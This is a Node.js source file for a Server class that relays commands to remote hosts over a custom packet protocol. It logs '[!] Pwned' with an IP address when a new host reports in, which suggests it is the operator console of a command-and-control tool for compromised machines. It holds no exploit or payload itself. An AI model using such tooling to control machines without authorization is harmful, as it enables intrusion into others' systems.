const EventEmitter = require('events');
const { packet_types } = require('../lib/protocol');
const { serializePacket, parsePacket, createPacket: _createPacket } = require('../lib/packet');
const { PacketConnection } = require('../lib/connection');


class Server extends EventEmitter {
    constructor(socket) {
        super();
        this.connection = new PacketConnection(socket);
        this.connection.on('packet', (data) => {
            try {
                let packet = parsePacket('control', 'response', data);
                this.handleResponse(packet);
            } catch (err) {
                console.error(err);
            }
        });
        socket.on('close', () => {
            console.log('Connection to host closed.');
        });
        Server.connectedServer = this;
    }

    close() {
        this.connection.socket.destroy();
    }

    handleResponse(packet) {
        if (typeof packet === 'string' && packet == 'abort') {
            let abortPkt = _createPacket('host', 'response', 'retcode');
            abortPkt.retcode = -999;
            this.emit('hostpacket', abortPkt);
            return;
        }

        if (packet.type.name == 'newpwn') {
            console.log(`[!] Pwned ${packet.ip}`);
        }
        if (packet.type.name == 'hostresponse') {
            this.emit('hostpacket', parsePacket('host', 'response', packet.data));
        }
    }

    /**
     * @param {string} name 
     */
    createPacket(name) {
        return _createPacket('host', 'command', name);
    }

    /**
     * @callback hostCmdCallback
     * @param {*} response
     */
    /** 
     * @param {*} packet 
     * @param {hostCmdCallback} callback 
     * @returns 
     */
    async sendHostCommand(packet, callback) {
        let wrappedPkt = {
            type: packet_types.control.command.find(
                (pkt) => pkt != null && pkt.name == 'relaycommand'
            ),
            id: 0, // TODO: fill in host id
            command: serializePacket('host', 'command', packet),
        };
        
        return new Promise((resolve) => {
            let handler = (responsePkt) => {
                if (responsePkt.type.name == 'retcode') {
                    this.removeListener('hostpacket', handler);
                    resolve(responsePkt.code);
                } else {
                    if (callback == null) {
                        if (responsePkt.type.name == 'out') {
                            console.log(responsePkt.out);
                        } else if (responsePkt.type.name == 'err') {
                            console.error(`ERROR: ${responsePkt.err}`);
                        }
                    } else {
                        callback(responsePkt);
                    }
                }
            };
            this.on('hostpacket', handler);
            this.sendCommand(wrappedPkt);
        });
    }

    sendCommand(packet) {
        let buf = serializePacket('control', 'command', packet);
        this.connection.write(buf);
    }
}

module.exports = Server;
